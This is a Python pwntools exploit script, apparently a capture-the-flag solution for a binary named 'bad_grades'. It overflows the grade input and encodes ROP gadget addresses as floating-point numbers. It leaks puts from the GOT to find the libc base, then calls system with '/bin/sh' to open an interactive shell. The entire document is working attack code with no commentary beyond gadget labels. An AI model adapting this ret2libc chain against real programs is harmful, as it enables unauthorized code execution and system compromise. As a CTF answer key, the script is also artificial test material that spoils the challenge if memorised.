#!/usr/bin/python3
from pwn import process, p64, u64, struct

shell = process("./bad_grades")

def rip():
    shell.sendlineafter(b"> ", b"2")
    shell.sendlineafter(b": ", b"39")

    for i in range(35):
        shell.sendlineafter(b": ", b".")

def rop(addr):
    float = struct.unpack("d", p64(addr))[0]
    shell.sendlineafter(b": ", str(float).encode())

rip()

rop(0x401263) # pop rdi; ret;
rop(0x601fa8) # puts@got
rop(0x400680) # puts@plt
rop(0x401108) # main()

shell.recvline_contains(b": ")
libc_base = u64(shell.recv(6).ljust(8, b"\x00")) - 0x80aa0

rip()

rop(libc_base + 0x0215bf) # pop rdi; ret;
rop(libc_base + 0x1b3e1a) # "/bin/sh"
rop(libc_base + 0x0008aa) # ret;
rop(libc_base + 0x04f550) # system()

shell.recvline_contains(b": ")
shell.interactive()
